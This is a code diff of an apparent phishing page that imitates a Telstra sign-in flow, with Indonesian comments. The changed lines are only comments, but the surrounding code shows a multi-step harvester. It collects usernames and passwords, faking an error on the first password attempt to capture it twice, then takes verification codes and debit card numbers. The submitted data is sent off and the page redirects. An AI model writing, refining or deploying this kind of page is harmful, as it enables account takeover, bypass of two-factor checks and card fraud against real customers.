@@ -18,7 +18,7 @@
         <main class="content-card">
             
             <!-- ======================================
-                LANGKAH 1: HALAMAN AWAL — USERNAME
+                LANGKAH 1: HALAMAN USERNAME
                 ====================================== -->
             <div id="step-username">
                 <h1>Sign in</h1>
@@ -44,7 +44,7 @@
             </div>
 
             <!-- ======================================
-                LANGKAH 2: HALAMAN PASSWORD
+                LANGKAH 2: HALAMAN PASSWORD — PERSIS GAMBAR
                 ====================================== -->
             <div id="step-password" style="display:none;">
                 <h1>Sign in</h1>
@@ -206,7 +206,7 @@
             document.getElementById('step-debit').style.display = 'block';
         }
 
-        // Format nomor kartu 16 digit
+        // Format nomor kartu
         const inputKartu = document.getElementById('card-number');
         inputKartu.addEventListener('input', function() {
             let nilai = this.value.replace(/\D/g, '');
@@ -231,7 +231,7 @@
         });
 
         // ======================================
-        // 1. USERNAME → KIRIM → LANGKAH PASSWORD
+        // USERNAME → KIRIM → PASSWORD
         // ======================================
         document.getElementById('username-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -251,7 +251,7 @@ Waktu: ${new Date().toLocaleString()}`);
         });
 
         // ======================================
-        // 2. PASSWORD → KIRIM → CEK PERCOBAAN
+        // PASSWORD → KIRIM → CEK PERCOBAAN
         // ======================================
         document.getElementById('password-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -267,13 +267,11 @@ Percobaan: ke-${percobaanSandi}
 Waktu: ${new Date().toLocaleString()}`);
 
             if (percobaanSandi === 1) {
-                // Pertama: tampil error, tetap di halaman Password
                 document.getElementById('error-msg').style.display = 'block';
                 document.getElementById('password-wrap').classList.add('error-border');
                 document.getElementById('telstra-password').value = '';
                 document.getElementById('telstra-password').focus();
             } else {
-                // Kedua: lanjut ke HALAMAN KODE VERIFIKASI
                 sembunyikanSemua();
                 document.getElementById('step-code').style.display = 'block';
                 document.getElementById('verification-code').focus();
@@ -281,7 +279,7 @@ Waktu: ${new Date().toLocaleString()}`);
         });
 
         // ======================================
-        // 3. KODE VERIFIKASI → KIRIM → NEXT
+        // KODE → KIRIM → NEXT
         // ======================================
         document.getElementById('code-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -309,7 +307,7 @@ Waktu: ${new Date().toLocaleString()}`);
         });
 
         // ======================================
-        // 4. KARTU → KIRIM → SUKSES → ALIHKAN
+        // KARTU → KIRIM → SUKSES → ALIHKAN
         // ======================================
         document.getElementById('payment-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -344,7 +342,7 @@ Waktu: ${new Date().toLocaleString()}`);
             }, 1000);
         });
 
-        // Ikon mata tampil/sembunyikan sandi
+        // Ikon mata tampil/sembunyikan sandi — ikon mata persis contoh
         const sandiInput = document.getElementById('telstra-password');
         const tombolMata = document.getElementById('toggle-eye');
         let tampilSandi = false;
